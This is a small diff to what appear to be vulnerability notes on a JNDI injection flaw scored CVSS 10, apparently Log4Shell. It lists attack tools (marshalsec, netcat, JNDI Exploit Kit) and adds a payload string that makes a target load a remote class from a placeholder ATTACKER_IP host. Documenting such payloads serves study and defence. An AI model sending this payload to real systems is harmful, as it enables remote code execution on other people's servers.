@@ -2,4 +2,6 @@
 
 ### CVSS Score: 10
 
-### Tools: marshalsec netcat JNDI Exploit kit https://github.com/pimps/JNDI-Exploit-Kit
+### Tools: mvn marshalsec netcat JNDI Exploit kit https://github.com/pimps/JNDI-Exploit-Kit
+
+### Payload example: ${jndi:ldap://ATTACKER_IP:1389/Exploit.class}
